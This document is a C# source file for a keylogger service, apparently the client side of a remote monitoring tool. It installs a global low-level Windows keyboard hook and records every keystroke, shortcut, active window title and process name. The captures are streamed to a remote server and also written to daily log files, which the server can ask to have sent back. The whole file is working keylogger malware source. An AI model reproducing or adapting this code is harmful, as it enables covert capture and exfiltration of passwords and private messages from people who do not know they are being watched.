using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Client.Networking;
using Common.Models;
using Common.Networking;
using Common.Utils;

namespace Client.Services
{
    public sealed class KeyLoggerService : IDisposable
    {
        private readonly ClientConnection _connection;
        private KeyLoggerMode _mode = KeyLoggerMode.Parallel;
        private bool _isRunning;
        private bool _forceVietnamese = false; // VIE button (Continuous only)
        private bool _deadKeyPending;
        private string? _clientId;

        private readonly StringBuilder _buffer = new StringBuilder();
        private readonly System.Timers.Timer _batchTimer = new System.Timers.Timer();
        private int _maxChars = 50;
        private int _maxIntervalMs = 15000;

        private const string HistoryFolderPath = @"D:\Keylogger";
        private const string HistoryFileExtension = ".txt";
        private readonly object _fileLock = new object();
        private string _currentDateKey = string.Empty;
        private string _currentDailyFilePath = string.Empty;

        private LowLevelKeyboardProc? _proc;
        private IntPtr _hookId = IntPtr.Zero;

        // combo detection
        private readonly HashSet<Keys> _pressedKeys = new HashSet<Keys>();
        private readonly HashSet<string> _activeCombos = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly Dictionary<string, KeyComboCategory> _comboMap = new Dictionary<string, KeyComboCategory>(StringComparer.OrdinalIgnoreCase);

        public KeyLoggerService(ClientConnection connection)
        {
            _connection = connection;
            _batchTimer.AutoReset = false;
            _batchTimer.Elapsed += (s, e) => FlushContinuous();
            InitializeComboMap();
        }

        public void Start(KeyLoggerStartPayload payload)
        {
            if (_isRunning) return;
            _mode = payload.Mode;
            _maxChars = Math.Max(1, payload.MaxChars);
            _maxIntervalMs = Math.Max(250, payload.MaxIntervalMs);
            _batchTimer.Interval = _maxIntervalMs;
            if (_mode == KeyLoggerMode.Continuous)
            {
                InitializeHistoryStorage();
            }
            _proc = HookCallback;
            _hookId = SetHook(_proc);
            _isRunning = true;
        }

        public void Stop()
        {
            if (!_isRunning) return;
            try
            {
                if (_mode == KeyLoggerMode.Continuous)
                {
                    FlushContinuous();
                }
            }
            catch { }
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
            _isRunning = false;
            _pressedKeys.Clear();
            _activeCombos.Clear();
        }

        public void Dispose()
        {
            Stop();
            _batchTimer?.Dispose();
        }

        public void SetClientId(string? clientId)
        {
            _clientId = clientId;
        }

        public Task HandleHistoryRequestAsync(KeyLoggerHistoryRequest request)
        {
            var dateKey = string.IsNullOrWhiteSpace(request.DateKey) ? ToDateKey(DateTime.Now) : request.DateKey;
            if (!string.IsNullOrEmpty(request.ClientId))
            {
                _clientId = request.ClientId;
            }
            return SendHistoryAsync(dateKey, createIfMissing: false);
        }

        private void InitializeComboMap()
        {
            // Chung
            Map("Ctrl + C", KeyComboCategory.Chung);
            Map("Ctrl + V", KeyComboCategory.Chung);
            Map("Ctrl + X", KeyComboCategory.Chung);
            Map("Ctrl + Z", KeyComboCategory.Chung);
            Map("Ctrl + Y", KeyComboCategory.Chung);
            Map("Ctrl + A", KeyComboCategory.Chung);
            Map("Ctrl + S", KeyComboCategory.Chung);
            Map("Ctrl + O", KeyComboCategory.Chung);
            Map("Ctrl + N", KeyComboCategory.Chung);
            Map("Ctrl + P", KeyComboCategory.Chung);

            // Điều hướng
            Map("Alt + Tab", KeyComboCategory.DieuHuong);
            Map("Alt + F4", KeyComboCategory.DieuHuong);
            Map("Win + D", KeyComboCategory.DieuHuong);
            Map("Win + E", KeyComboCategory.DieuHuong);
            Map("Win + L", KeyComboCategory.DieuHuong);
            Map("Win + R", KeyComboCategory.DieuHuong);
            Map("Alt + Esc", KeyComboCategory.DieuHuong);
            Map("Ctrl + Esc", KeyComboCategory.DieuHuong);

            // Soạn thảo
            Map("Shift + Left", KeyComboCategory.SoanThao);
            Map("Shift + Right", KeyComboCategory.SoanThao);
            Map("Ctrl + Left", KeyComboCategory.SoanThao);
            Map("Ctrl + Right", KeyComboCategory.SoanThao);
            Map("Ctrl + Back", KeyComboCategory.SoanThao);
            Map("Ctrl + Shift + Left", KeyComboCategory.SoanThao);
            Map("Ctrl + Shift + Right", KeyComboCategory.SoanThao);
            Map("Shift + Home", KeyComboCategory.SoanThao);
            Map("Shift + End", KeyComboCategory.SoanThao);
            Map("Ctrl + Home", KeyComboCategory.SoanThao);
            Map("Ctrl + End", KeyComboCategory.SoanThao);

            // Trình duyệt
            Map("Ctrl + T", KeyComboCategory.TrinhDuyet);
            Map("Ctrl + W", KeyComboCategory.TrinhDuyet);
            Map("Ctrl + Tab", KeyComboCategory.TrinhDuyet);
            Map("Ctrl + Shift + T", KeyComboCategory.TrinhDuyet);
            Map("Ctrl + L", KeyComboCategory.TrinhDuyet);

            // Hệ thống
            Map("Ctrl + Alt + Del", KeyComboCategory.HeThong);
            Map("Ctrl + Shift + Esc", KeyComboCategory.HeThong);
            Map("Win + Shift + S", KeyComboCategory.HeThong);
            Map("Win + PrintScreen", KeyComboCategory.HeThong);

            // Tùy chỉnh / văn phòng
            Map("Ctrl + B", KeyComboCategory.TuyChinh);
            Map("Ctrl + I", KeyComboCategory.TuyChinh);
            Map("Ctrl + U", KeyComboCategory.TuyChinh);
            Map("Ctrl + F", KeyComboCategory.TuyChinh);
            Map("Ctrl + H", KeyComboCategory.TuyChinh);
            Map("Ctrl + K", KeyComboCategory.TuyChinh);
            Map("Ctrl + Shift + L", KeyComboCategory.TuyChinh);
            Map("Ctrl + Shift + N", KeyComboCategory.TuyChinh);

            // Đặc biệt
            Map("Shift + Delete", KeyComboCategory.DacBiet);
            Map("Alt + Enter", KeyComboCategory.DacBiet);
            Map("Ctrl + Alt + T", KeyComboCategory.DacBiet);
            Map("Ctrl + D", KeyComboCategory.DacBiet);
            Map("Ctrl + J", KeyComboCategory.DacBiet);
            Map("Win + Left", KeyComboCategory.DacBiet);
            Map("Win + Right", KeyComboCategory.DacBiet);
            Map("Win + Up", KeyComboCategory.DacBiet);
            Map("Win + Down", KeyComboCategory.DacBiet);
            Map("Alt + Space", KeyComboCategory.DacBiet);
        }

        private void Map(string combo, KeyComboCategory cat) => _comboMap[combo] = cat;

        private void FlushContinuous()
        {
            if (_buffer.Length == 0) { _batchTimer.Stop(); return; }
            var text = _buffer.ToString();
            // If VI mode enabled for continuous, process the sentence via internal VN processor
            if (_forceVietnamese)
            {
                var vi = new Common.Utils.VietnameseInputProcessor();
                text = vi.ProcessSentence(text);
            }
            _buffer.Clear();
            var (title, proc) = GetWindowContext();
            var dateKey = EnsureCurrentDateKey();
            if (string.IsNullOrEmpty(dateKey))
            {
                dateKey = ToDateKey(DateTime.Now);
            }
            var packet = new KeyLoggerBatch
            {
                Payload = new KeyLoggerBatchPayload
                {
                    Text = text,
                    TimestampUtc = DateTime.UtcNow,
                    WindowTitle = title,
                    ProcessName = proc,
                    DateKey = dateKey
                },
                ClientId = _clientId
            };
            PersistBatch(packet.Payload);
            var json = JsonHelper.Serialize(packet);
            _ = _connection.SendAsync(json);
            _batchTimer.Stop();
        }

        private void AppendContinuous(string s)
        {
            _buffer.Append(s);
            if (_buffer.Length >= _maxChars)
            {
                FlushContinuous();
                _batchTimer.Stop();
                return;
            }
            _batchTimer.Stop();
            _batchTimer.Interval = _maxIntervalMs;
            _batchTimer.Start();
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = wParam.ToInt32();
                var kbd = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                bool isKeyDown = msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN;
                bool isKeyUp = msg == WM_KEYUP || msg == WM_SYSKEYUP;
                var key = (Keys)kbd.vkCode;

                if (isKeyDown)
                {
                    _pressedKeys.Add(key);
                    var combo = TryBuildComboOnKeyDown(key);
                    if (combo != null)
                    {
                        EmitCombo(combo.Value.comboString, combo.Value.category);
                        var effModeForCombo = DetermineEffectiveMode();
                        if (effModeForCombo == KeyLoggerMode.Continuous)
                        {
                            AppendContinuous($"[${combo.Value.comboString}]");
                        }
                    }
                    else
                    {
                        var s = KeyToUnicodeString(key, kbd.scanCode);
                        if (!string.IsNullOrEmpty(s))
                        {
                            var effectiveMode = DetermineEffectiveMode();
            if (effectiveMode == KeyLoggerMode.Parallel)
                            {
                                var evt = new KeyLoggerEvent { Payload = new KeyLoggerEventPayload { Key = s, TimestampUtc = DateTime.UtcNow }, ClientId = _clientId };
                                var json = JsonHelper.Serialize(evt);
                                _ = _connection.SendAsync(json);
                            }
                            else
                            {
                                if (s == "Enter")
                                {
                                    FlushContinuous();
                                    _batchTimer.Stop();
                                }
                                else
                                {
                                    AppendContinuous(s);
                                }
                            }
                        }
                    }
                }

                if (isKeyUp)
                {
                    _pressedKeys.Remove(key);
                    // clear combos when modifiers released
                    if (!IsAnyComboStillActive()) _activeCombos.Clear();
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private (string comboString, KeyComboCategory category)? TryBuildComboOnKeyDown(Keys key)
        {
            var parts = new List<string>();
            bool ctrl = IsDown(Keys.LControlKey) || IsDown(Keys.RControlKey) || _pressedKeys.Contains(Keys.ControlKey);
            bool alt = IsDown(Keys.LMenu) || IsDown(Keys.RMenu) || _pressedKeys.Contains(Keys.Menu);
            bool shift = IsDown(Keys.LShiftKey) || IsDown(Keys.RShiftKey) || _pressedKeys.Contains(Keys.ShiftKey);
            bool win = IsDown(Keys.LWin) || IsDown(Keys.RWin) || _pressedKeys.Contains(Keys.LWin) || _pressedKeys.Contains(Keys.RWin);

            if (!(ctrl || alt || shift || win)) return null;

            if (ctrl) parts.Add("Ctrl");
            if (alt) parts.Add("Alt");
            if (shift) parts.Add("Shift");
            if (win) parts.Add("Win");

            string keyPart = ComboKeyPart(key);
            if (string.IsNullOrEmpty(keyPart)) return null;
            parts.Add(keyPart);

            var combo = string.Join(" + ", parts);

            if (_comboMap.TryGetValue(combo, out var cat))
            {
                if (_activeCombos.Contains(combo)) return null;
                _activeCombos.Add(combo);
                return (combo, cat);
            }
            return null;
        }

        private static string ComboKeyPart(Keys key)
        {
            switch (key)
            {
                case Keys.C: case Keys.V: case Keys.X: case Keys.Z: case Keys.Y: case Keys.A:
                case Keys.S: case Keys.O: case Keys.N: case Keys.P: case Keys.T: case Keys.W:
                case Keys.L: case Keys.B: case Keys.I: case Keys.U: case Keys.F: case Keys.H:
                case Keys.K: case Keys.J: case Keys.D:
                    return key.ToString().ToUpperInvariant();
                case Keys.Tab: return "Tab";
                case Keys.F4: return "F4";
                case Keys.Left: return "Left";
                case Keys.Right: return "Right";
                case Keys.Up: return "Up";
                case Keys.Down: return "Down";
                case Keys.Home: return "Home";
                case Keys.End: return "End";
                case Keys.Back: return "Back";
                case Keys.Delete: return "Delete";
                case Keys.Space: return "Space";
                case Keys.PrintScreen: return "PrintScreen";
                case Keys.Enter: return "Enter";
                default:
                    return string.Empty;
            }
        }

        private string KeyToUnicodeString(Keys key, uint scanCode)
        {
            if (key == Keys.Enter) return "Enter";
            if (key == Keys.Back) return "[Backspace]";
            if (key == Keys.Tab) return "\t";

            var keyboardState = new byte[256];
            if (!GetKeyboardState(keyboardState)) return SimpleAsciiFallback(key);

            // Set modifier bits based on current pressed keys
            if (IsDown(Keys.ShiftKey) || _pressedKeys.Contains(Keys.ShiftKey) || _pressedKeys.Contains(Keys.LShiftKey) || _pressedKeys.Contains(Keys.RShiftKey))
                keyboardState[0x10] |= 0x80; // VK_SHIFT
            if (IsDown(Keys.ControlKey) || _pressedKeys.Contains(Keys.ControlKey) || _pressedKeys.Contains(Keys.LControlKey) || _pressedKeys.Contains(Keys.RControlKey))
                keyboardState[0x11] |= 0x80; // VK_CONTROL
            if (IsDown(Keys.Menu) || _pressedKeys.Contains(Keys.Menu) || _pressedKeys.Contains(Keys.LMenu) || _pressedKeys.Contains(Keys.RMenu))
                keyboardState[0x12] |= 0x80; // VK_MENU

            // Mark current key as down for ToUnicodeEx mapping
            int vk = (int)key & 0xFF;
            if (vk >= 0 && vk < 256) keyboardState[vk] |= 0x80;

            // Use foreground window's thread layout to map correctly for per-app layouts
            var fg = GetForegroundWindow();
            uint fgPid;
            var fgTid = GetWindowThreadProcessId(fg, out fgPid);
            var keyboardLayout = GetKeyboardLayout(fgTid);
            var sb = new StringBuilder(8);
            // If scanCode is zero, try mapping from VK
            if (scanCode == 0)
            {
                scanCode = MapVirtualKey((uint)key, 0);
            }
            int result = ToUnicodeEx((uint)key, scanCode, keyboardState, sb, sb.Capacity, 0, keyboardLayout);
            if (result > 0)
            {
                _deadKeyPending = false;
                return sb.ToString();
            }
            if (result == -1)
            {
                // dead key: wait for next key to compose accented character
                _deadKeyPending = true;
                // Clear dead-key state by calling again with empty buffer (per docs)
                var dummy = new StringBuilder(8);
                _ = ToUnicodeEx((uint)key, scanCode, keyboardState, dummy, dummy.Capacity, 0, keyboardLayout);
                return string.Empty;
            }

            return SimpleAsciiFallback(key);
        }

        private static string SimpleAsciiFallback(Keys key)
        {
            if (key == Keys.Space) return " ";
            if (key >= Keys.A && key <= Keys.Z) return key.ToString().ToLowerInvariant();
            if (key >= Keys.D0 && key <= Keys.D9) return ((char)('0' + (key - Keys.D0))).ToString();
            if (key == Keys.OemPeriod) return ".";
            if (key == Keys.Oemcomma) return ",";
            if (key == Keys.OemMinus) return "-";
            if (key == Keys.Oemplus) return "+";
            return string.Empty;
        }

        // removed word-by-word mode per requirement

        private (string title, string process) GetWindowContext()
        {
            var h = GetForegroundWindow();
            if (h == IntPtr.Zero) return (string.Empty, string.Empty);
            var sb = new StringBuilder(512);
            GetWindowText(h, sb, sb.Capacity);
            GetWindowThreadProcessId(h, out var pid);
            try
            {
                var p = Process.GetProcessById((int)pid);
                return (sb.ToString(), p.ProcessName);
            }
            catch
            {
                return (sb.ToString(), string.Empty);
            }
        }

        private void InitializeHistoryStorage()
        {
            try
            {
                EnsureHistoryFolder();
                var todayKey = ToDateKey(DateTime.Now);
                _currentDateKey = todayKey;
                _currentDailyFilePath = EnsureDailyFile(todayKey);
                _ = SendHistoryAsync(todayKey, createIfMissing: true);
            }
            catch
            {
                // ignore storage initialization errors to keep keylogger running
            }
        }

        private string EnsureCurrentDateKey()
        {
            try
            {
                var todayKey = ToDateKey(DateTime.Now);
                if (!string.Equals(_currentDateKey, todayKey, StringComparison.Ordinal))
                {
                    _currentDateKey = todayKey;
                    _currentDailyFilePath = EnsureDailyFile(todayKey);
                    _ = SendHistoryAsync(todayKey, createIfMissing: true);
                }
                if (string.IsNullOrEmpty(_currentDailyFilePath) || !File.Exists(_currentDailyFilePath))
                {
                    _currentDailyFilePath = EnsureDailyFile(todayKey);
                }
                return _currentDateKey;
            }
            catch
            {
                return _currentDateKey;
            }
        }

        private void EnsureHistoryFolder()
        {
            Directory.CreateDirectory(HistoryFolderPath);
        }

        private string EnsureDailyFile(string dateKey)
        {
            EnsureHistoryFolder();
            var filePath = Path.Combine(HistoryFolderPath, $"{dateKey}{HistoryFileExtension}");
            if (!File.Exists(filePath))
            {
                lock (_fileLock)
                {
                    if (!File.Exists(filePath))
                    {
                        using (File.Create(filePath)) { }
                    }
                }
            }
            return filePath;
        }

        private void PersistBatch(KeyLoggerBatchPayload payload)
        {
            try
            {
                var filePath = EnsureDailyFile(payload.DateKey);
                var block = BuildHistoryBlock(payload);
                lock (_fileLock)
                {
                    File.AppendAllText(filePath, block);
                }
            }
            catch
            {
                // storage failures should not break streaming
            }
        }

        private static string BuildHistoryBlock(KeyLoggerBatchPayload payload)
        {
            var sb = new StringBuilder();
            var header = $"{payload.TimestampUtc.ToLocalTime():yyyy-MM-dd HH:mm:ss} | {payload.WindowTitle} ({payload.ProcessName})";
            sb.AppendLine(header);
            sb.AppendLine(payload.Text);
            sb.AppendLine();
            return sb.ToString();
        }

        private static string ToDateKey(DateTime date) => date.ToString("yyyy-MM-dd");

        private async Task SendHistoryAsync(string dateKey, bool createIfMissing)
        {
            try
            {
                EnsureHistoryFolder();
                var filePath = Path.Combine(HistoryFolderPath, $"{dateKey}{HistoryFileExtension}");
                if (!File.Exists(filePath) && createIfMissing)
                {
                    lock (_fileLock)
                    {
                        if (!File.Exists(filePath))
                        {
                            using (File.Create(filePath)) { }
                        }
                    }
                }
                bool exists = File.Exists(filePath);
                string content = string.Empty;
                if (exists)
                {
                    lock (_fileLock)
                    {
                        content = File.ReadAllText(filePath);
                    }
                }
                var response = new KeyLoggerHistoryResponse
                {
                    ClientId = _clientId,
                    DateKey = dateKey,
                    Exists = exists,
                    Content = content
                };
                var json = JsonHelper.Serialize(response);
                await _connection.SendAsync(json);
            }
            catch (Exception ex)
            {
                var response = new KeyLoggerHistoryResponse
                {
                    ClientId = _clientId,
                    DateKey = dateKey,
                    Exists = false,
                    Error = ex.Message,
                    Content = string.Empty
                };
                var json = JsonHelper.Serialize(response);
                await _connection.SendAsync(json);
            }
        }

        private void EmitCombo(string combo, KeyComboCategory category)
        {
            var (title, proc) = GetWindowContext();
            var evt = new KeyLoggerComboEvent
            {
                Payload = new KeyLoggerComboPayload
                {
                    Combo = combo,
                    Category = category,
                    TimestampUtc = DateTime.UtcNow,
                    WindowTitle = title,
                    ProcessName = proc
                },
                ClientId = _clientId
            };
            var json = JsonHelper.Serialize(evt);
            _ = _connection.SendAsync(json);
        }

        private bool IsDown(Keys key) => (GetKeyState((int)key) & 0x8000) != 0;

        // Win32 interop
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        // IMM32 for IME detection
        [DllImport("imm32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ImmIsIME(IntPtr hkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private bool IsAnyComboStillActive()
        {
            // if any modifier remains pressed, keep combos; simple heuristic
            if (_pressedKeys.Contains(Keys.LControlKey) || _pressedKeys.Contains(Keys.RControlKey) || _pressedKeys.Contains(Keys.ControlKey)) return true;
            if (_pressedKeys.Contains(Keys.LMenu) || _pressedKeys.Contains(Keys.RMenu) || _pressedKeys.Contains(Keys.Menu)) return true;
            if (_pressedKeys.Contains(Keys.LShiftKey) || _pressedKeys.Contains(Keys.RShiftKey) || _pressedKeys.Contains(Keys.ShiftKey)) return true;
            if (_pressedKeys.Contains(Keys.LWin) || _pressedKeys.Contains(Keys.RWin)) return true;
            return false;
        }

        private KeyLoggerMode DetermineEffectiveMode()
        {
            if (_mode == KeyLoggerMode.Continuous) return KeyLoggerMode.Continuous;
            return KeyLoggerMode.Parallel;
        }

        private bool IsVietnameseInputActive() => _forceVietnamese;

        public void SetLanguageMode(bool vietnamese)
        {
            _forceVietnamese = vietnamese;
        }
    }
}


